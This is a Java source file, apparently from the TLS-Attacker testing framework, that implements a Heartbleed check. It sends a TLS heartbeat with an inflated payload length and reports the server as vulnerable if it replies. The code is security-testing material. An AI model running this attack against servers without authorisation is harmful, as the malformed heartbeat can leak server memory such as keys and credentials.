/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.impl;

import anonymous.tlsattacker.tls.Attacker;
import anonymous.tlsattacker.attacks.config.HeartbleedCommandConfig;
import anonymous.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import anonymous.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import anonymous.tlsattacker.modifiablevariable.integer.IntegerModificationFactory;
import anonymous.tlsattacker.modifiablevariable.integer.ModifiableInteger;
import anonymous.tlsattacker.modifiablevariable.singlebyte.ModifiableByte;
import anonymous.tlsattacker.tls.config.ConfigHandler;
import anonymous.tlsattacker.tls.constants.ConnectionEnd;
import anonymous.tlsattacker.tls.protocol.heartbeat.HeartbeatMessage;
import anonymous.tlsattacker.tls.constants.ProtocolMessageType;
import anonymous.tlsattacker.tls.exceptions.WorkflowExecutionException;
import anonymous.tlsattacker.tls.util.LogLevel;
import anonymous.tlsattacker.tls.workflow.TlsContext;
import anonymous.tlsattacker.tls.workflow.WorkflowExecutor;
import anonymous.tlsattacker.tls.workflow.WorkflowTrace;
import anonymous.tlsattacker.transport.TransportHandler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the Heartbeat attack against a server and logs an error in case the
 * server responds with a valid heartbeat message.
 * 
 * @author anonymous anonymous (anonymous.anonymous@anonymous)
 */
public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(HeartbleedAttack.class);

    public HeartbleedAttack(HeartbleedCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();

	ModifiableByte heartbeatMessageType = new ModifiableByte();
	ModifiableInteger payloadLength = new ModifiableInteger();
	payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
	ModifiableByteArray payload = new ModifiableByteArray();
	payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
	HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
	hb.setHeartbeatMessageType(heartbeatMessageType);
	hb.setPayload(payload);
	hb.setPayloadLength(payloadLength);

	try {
	    workflowExecutor.executeWorkflow();
	} catch (WorkflowExecutionException ex) {
	    LOGGER.info(
		    "The TLS protocol flow was not executed completely, follow the debug messages for more information.",
		    ex);
	}

	if (trace.containsServerFinished()) {
	    HeartbeatMessage lastMessage = (HeartbeatMessage) trace.getProtocolMessages().get(
		    trace.getProtocolMessages().size() - 1);
	    if (lastMessage.getMessageIssuer() == ConnectionEnd.SERVER) {
		LOGGER.log(LogLevel.CONSOLE_OUTPUT,
			"Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
	    } else {
		LOGGER.log(LogLevel.CONSOLE_OUTPUT,
			"(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
	    }
	} else {
	    LOGGER.log(LogLevel.CONSOLE_OUTPUT,
		    "Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
	}

	tlsContexts.add(tlsContext);

	transportHandler.closeConnection();
    }
}
